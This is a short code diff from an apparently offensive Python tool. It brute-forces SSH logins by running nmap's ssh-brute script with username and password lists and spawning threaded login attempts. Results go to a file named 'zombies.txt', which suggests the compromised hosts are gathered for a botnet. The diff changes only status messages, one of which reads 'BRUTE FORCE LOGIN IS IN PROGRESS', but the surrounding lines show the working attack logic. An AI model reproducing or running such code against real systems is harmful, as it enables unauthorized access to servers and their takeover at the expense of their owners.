@@ -48,7 +48,7 @@ def sshLogin(user, ip, password):
 
 
 def ssh(ip):
-    threadSafePrint(bcolors.BOLD , bcolors.HEADER , " ************************* Trying to login to *****************", ip ,  bcolors.ENDC)
+    threadSafePrint(bcolors.BOLD , bcolors.HEADER , " ************************* BRUTE FORCE LOGIN IS IN PROGRESS *****************", ip ,  bcolors.ENDC)
     zombies = openFile('zombies.txt', 'a')
     scanner_t2.scan(hosts=ip, ports='22', arguments='--script ssh-brute --script-args userdb=users.txt,'
                                                     'passdb=passwords.txt')
@@ -65,7 +65,7 @@ def ssh(ip):
                 t = Thread(target=sshLogin, args=(user, ip, password))
                 t.start()
             except:
-                threadSafePrint(bcolors.BOLD , bcolors.FAIL , "Not Connected" ,  bcolors.ENDC)
+                threadSafePrint(bcolors.BOLD , bcolors.FAIL , "xxxxxxxxxxxxxxxxxxxxx NOT CONNECTED xxxxxxxxxxxxxxxxxxx" ,  bcolors.ENDC)
     zombies.close()
 
 
